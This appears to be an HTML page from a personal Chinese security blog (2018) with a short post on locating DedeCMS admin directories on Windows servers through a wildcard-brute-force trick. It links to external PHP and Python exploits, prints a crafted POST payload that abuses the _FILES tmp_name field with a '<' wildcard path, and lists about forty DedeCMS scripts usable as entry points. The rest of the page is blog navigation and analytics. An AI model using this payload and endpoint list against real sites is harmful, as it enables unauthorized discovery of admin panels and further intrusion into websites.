@@ -1,0 +1,389 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="通配符," />
+  
+
+  
+    <meta name="description" content="dede通配符爆破后台~" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/logo.png">
+  <title>dede通配符爆破后台~ [ Life&#39;s blog ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="http://life-time.me/images/logo.png">
+    <span class="title">Life&#39;s blog</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">首页</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">标签</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/search" class="pure-menu-link">搜索</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/atom.xml" class="pure-menu-link">订阅</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        dede通配符爆破后台~
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-03-03T04:37:18.000Z">
+        2018-03-03
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/通配符/">通配符</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+    </header>
+
+    <div class="post-content">
+      <h3 id="emmmmmm，再也不用担心找不到dede的后台了-只支持win"><a href="#emmmmmm，再也不用担心找不到dede的后台了-只支持win" class="headerlink" title="emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)"></a>emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)</h3><ul>
+<li><p><strong>exp(php):<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/2064</a></strong></p>
+</li>
+<li><p><strong>exp(python3):<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a></strong></p>
+<ul>
+<li>这个地方要说一下，包含了common.inc.php的都可以跑…..</li>
+</ul>
+</li>
+</ul>
+<h3 id="预防tags-php和index-php不能跑，这里我总结了一下可以利用的php"><a href="#预防tags-php和index-php不能跑，这里我总结了一下可以利用的php" class="headerlink" title="预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:"></a>预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:</h3><ul>
+<li><strong>这里二级目录爆破的话，exp的语句需要改一下</strong></li>
+</ul>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=../$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>/install/module_autos.php</li>
+<li>/m/index.php</li>
+<li>/m/list.php</li>
+<li>/m/view.php</li>
+<li>/member/config.php</li>
+<li>/plus/ad_js.php</li>
+<li>/plus/advancedsearch.php</li>
+<li>/plus/arcmulti.php</li>
+<li>/plus/bookfeedback.php</li>
+<li>/plus/bookfeedback_js.php</li>
+<li>/plus/car.php</li>
+<li>/plus/carbuyaction.php</li>
+<li>/plus/comments_frame.php</li>
+<li>/plus/count.php</li>
+<li>/plus/digg_ajax.php</li>
+<li>/plus/digg_frame.php</li>
+<li>/plus/disdls.php</li>
+<li>/plus/diy.php</li>
+<li>/plus/download.php</li>
+<li>/plus/erraddsave.php</li>
+<li>/plus/feedback.php</li>
+<li>/plus/feedback_ajax.php</li>
+<li>/plus/feedback_js.php</li>
+<li>/plus/flink.php</li>
+<li>/plus/flink_add.php</li>
+<li>/plus/freelist.php</li>
+<li>/plus/guestbook.php</li>
+<li>/plus/heightsearch.php</li>
+<li>/plus/list.php</li>
+<li>/plus/mytag_js.php</li>
+<li>/plus/posttocar.php</li>
+<li>/plus/qrcode.php</li>
+<li>/plus/recommend.php</li>
+<li>/plus/rss.php</li>
+<li>/plus/search.php</li>
+<li>/plus/showphoto.php</li>
+<li>/plus/stow.php</li>
+<li>/plus/task.php</li>
+<li>/plus/view.php</li>
+<li>/plus/vote.php</li>
+</ul>
+</blockquote>
+
+    </div>
+
+    <div>全文完。</div>
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#emmmmmm，再也不用担心找不到dede的后台了-只支持win"><span class="toc-text">emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预防tags-php和index-php不能跑，这里我总结了一下可以利用的php"><span class="toc-text">预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2018/01/12/win-download/" rel="next" title="win远程下载文件的各种姿势~">
+          win远程下载文件的各种姿势~
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2018/03/16/ubuntu内核提权复现/" rel="prev" title="ubuntu本地提权复现">
+            ubuntu本地提权复现
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'XXX';
+    
+    var disqus_url = 'http://life-time.me/2018/03/03/dede通配符爆破后台/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//XXX.disqus.com/count.js" async></script>
+
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="http://life-time.me">首页</a> |
+        <a class="bottom-item" href="http://life-time.me" target="_blank">主站</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/KevinOfNeu/hexo-theme-xoxo" target="_blank">Theme xoxo</a>
+    </div>
+</footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function () {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?FuckUBaidu";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+              m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'XXX', 'auto');
+      ga('send', 'pageview');
+  </script>
+
+
+</body>
+</html>
